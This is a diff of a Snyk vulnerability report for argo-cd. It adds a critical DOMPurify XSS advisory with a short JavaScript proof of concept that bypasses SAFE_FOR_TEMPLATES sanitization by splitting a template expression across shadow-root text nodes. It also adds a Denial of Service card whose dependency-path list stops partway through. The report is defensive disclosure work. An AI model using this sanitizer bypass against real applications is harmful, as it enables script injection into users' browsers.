@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title>Snyk test report</title>
-  <meta name="description" content="141 known vulnerabilities found in 37723 vulnerable dependency paths.">
+  <meta name="description" content="152 known vulnerabilities found in 37757 vulnerable dependency paths.">
   <base target="_blank">
   <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.png"
     sizes="194x194">
@@ -492,7 +492,7 @@
               <div class="header-wrap">
                   <h1 class="project__header__title">Snyk test report</h1>
     
-                <p class="timestamp">October 25th 2026, 12:41:45 am (UTC+00:00)</p>
+                <p class="timestamp">November 1st 2026, 12:32:50 am (UTC+00:00)</p>
               </div>
               <div class="source-panel">
                 <span>Scanned the following paths:</span>
@@ -506,8 +506,8 @@
               </div>
     
               <div class="meta-counts">
-                <div class="meta-count"><span>141</span> <span>known vulnerabilities</span></div>
-                <div class="meta-count"><span>37723 vulnerable dependency paths</span></div>
+                <div class="meta-count"><span>152</span> <span>known vulnerabilities</span></div>
+                <div class="meta-count"><span>37757 vulnerable dependency paths</span></div>
                 <div class="meta-count"><span>3235</span> <span>dependencies</span></div>
               </div><!-- .meta-counts -->
             </div><!-- .layout-container--short -->
@@ -3967,6 +3967,166 @@
         
             <div class="cta card__cta">
                 <p><a href="https://snyk.io/vuln/SNYK-JS-DOMPURIFY-21460653">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--critical" data-snyk-test="critical">
+            <h2 class="card__title">Cross-site Scripting (XSS)</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--critical">
+                        <span class="label__text">critical severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd <span class="list-paths__item__arrow">›</span> ui/yarn.lock
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            dompurify
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    argo-cd-ui@1.0.0, redoc@2.4.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        argo-cd-ui@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        redoc@2.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        dompurify@3.4.13
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/cure53/DOMPurify">dompurify</a> is a DOM-only XSS sanitizer for HTML, MathML and SVG.</p>
+        <p>Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via a sanitization bypass in <code>_scrubTemplateExpressions</code> when <code>SAFE_FOR_TEMPLATES</code> is enabled alongside a DOM-returning mode. The post-walk safety net <code>_scrubTemplateExpressions</code> (<code>src/purify.ts:1717</code>) recurses into <code>&lt;template&gt;.content</code> but never into attached shadow roots. An attacker who controls a DOM node carrying an attached shadow root can split a template expression (e.g. <code>${...}</code>, <code>{{...}}</code>, or <code>&lt;%...%&gt;</code>) across text nodes separated by disallowed elements. After sanitization removes those elements, the fragments become adjacent and reconstitute a complete expression that a downstream template engine evaluates, resulting in cross-site scripting or template injection.</p>
+        <p><strong>Note:</strong> This is only exploitable when <code>SAFE_FOR_TEMPLATES: true</code> is set together with a DOM-returning mode (<code>RETURN_DOM: true</code>, <code>RETURN_DOM_FRAGMENT: true</code>, or <code>IN_PLACE: true</code>), and the sanitized content is fed into a downstream template evaluator.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code class="language-text">Preconditions:
+          - DOMPurify built from the affected source (dist/purify.js or an ESM/CJS bundle).
+          - A browser (or DOM implementation) with shadow DOM support.
+          - Application constructs a DOM node with an attached shadow root before sanitizing,
+            and later evaluates the shadow root&#39;s text content as a template.
+        </code></pre>
+        <p>Build a host element whose shadow root holds a template expression split across text nodes separated by disallowed elements, then sanitize in place with <code>SAFE_FOR_TEMPLATES</code>:</p>
+        <pre><code class="language-javascript">const host = document.createElement(&#39;div&#39;);
+        const root = host.attachShadow({ mode: &#39;open&#39; });
+        
+        // Split &quot;${alert(document.domain)}&quot; so no single fragment matches a regex.
+        // &lt;object&gt; is not in the default ALLOWED_TAGS and is removed during sanitization,
+        // leaving the surrounding text-node siblings adjacent.
+        root.appendChild(document.createTextNode(&#39;$&#39;));
+        root.appendChild(document.createElement(&#39;object&#39;));
+        root.appendChild(document.createTextNode(&#39;{alert(document.domain)}&#39;));
+        
+        DOMPurify.sanitize(host, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });
+        
+        // After the disallowed element is removed, the fragments are adjacent and survive.
+        host.shadowRoot.normalize();
+        console.log(host.shadowRoot.textContent);
+        </code></pre>
+        <pre><code class="language-text">${alert(document.domain)}
+        </code></pre>
+        <p>A downstream template evaluator reading <code>shadowRoot.textContent</code> (for example <code>new Function(&#39;return </code>&#39; + content + &#39;<code>&#39;)()</code> or any <code>${...}</code>/<code>{{...}}</code> engine) then evaluates the fully formed expression.</p>
+        <p><strong>Note:</strong> The PoC states it requires DOMPurify built from the affected source and a browser with shadow DOM support, with the application constructing a DOM node with an attached shadow root before sanitizing and later evaluating the shadow root&#39;s text content as a template.</p>
+        <h2 id="details">Details</h2>
+        <p>Cross-site scripting (or XSS) is a code vulnerability that occurs when an attacker “injects” a malicious script into an otherwise trusted website. The injected script gets downloaded and executed by the end user’s browser when the user interacts with the compromised website.</p>
+        <p>This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.</p>
+        <p>Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.</p>
+        <p>Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, <code>&lt;</code> can be coded as  <code>&amp;lt</code>; and <code>&gt;</code> can be coded as <code>&amp;gt</code>; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses <code>&lt;</code> and <code>&gt;</code> as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.</p>
+        <p>The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. </p>
+        <h3 id="types-of-attacks">Types of attacks</h3>
+        <p>There are a few methods by which XSS can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Stored</strong></td>
+        <td>Server</td>
+        <td>The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.</td>
+        </tr>
+        <tr>
+        <td><strong>Reflected</strong></td>
+        <td>Server</td>
+        <td>The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.</td>
+        </tr>
+        <tr>
+        <td><strong>DOM-based</strong></td>
+        <td>Client</td>
+        <td>The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.</td>
+        </tr>
+        <tr>
+        <td><strong>Mutated</strong></td>
+        <td></td>
+        <td>The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.</td>
+        </tr>
+        </tbody></table>
+        <h3 id="affected-environments">Affected environments</h3>
+        <p>The following environments are susceptible to an XSS attack:</p>
+        <ul>
+        <li>Web servers</li>
+        <li>Application servers</li>
+        <li>Web application environments</li>
+        </ul>
+        <h3 id="how-to-prevent">How to prevent</h3>
+        <p>This section describes the top best practices designed to specifically protect your code: </p>
+        <ul>
+        <li>Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. </li>
+        <li>Convert special characters such as <code>?</code>, <code>&amp;</code>, <code>/</code>, <code>&lt;</code>, <code>&gt;</code> and spaces to their respective HTML or URL encoded equivalents. </li>
+        <li>Give users the option to disable client-side scripts.</li>
+        <li>Redirect invalid requests.</li>
+        <li>Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.</li>
+        <li>Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.</li>
+        <li>Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.</li>
+        </ul>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>dompurify</code> to version 3.4.17 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-cg2g-xh64-v4q7">GitHub Advisory</a></li>
+        <li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2561479">Red Hat Bugzilla Bug</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-DOMPURIFY-21755399">More about this vulnerability</a></p>
             </div>
         
         </div><!-- .card -->
@@ -588461,6 +588621,570 @@
         
         </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Denial of Service (DoS)</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--high">
+                        <span class="label__text">high severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd/argoproj/argo-cd/v3 <span class="list-paths__item__arrow">›</span> go.mod
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            golang.org/x/net/html
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    github.com/argoproj/argo-cd/v3@0.0.0, k8s.io/client-go/tools/portforward@0.34.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/portforward@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/diff@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/utils/kube@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/cache@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/utils/kube@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/common@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/utils/kube@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/hook@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/hook/helm@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/common@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/utils/kube@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/syncwaves@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/hook/helm@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/common@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/utils/kube@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/health@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/hook@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/hook/helm@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/common@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/utils/kube@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/ignore@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/hook@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/hook/helm@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/sync/common@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/argoproj/argo-cd/gitops-engine/pkg/utils/kube@#97ad5b59a627
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.58.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/gitops-engine@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/auth@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.44.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/gitops-engine@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/create@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.44.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/gitops-engine@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/apply@0.34.0
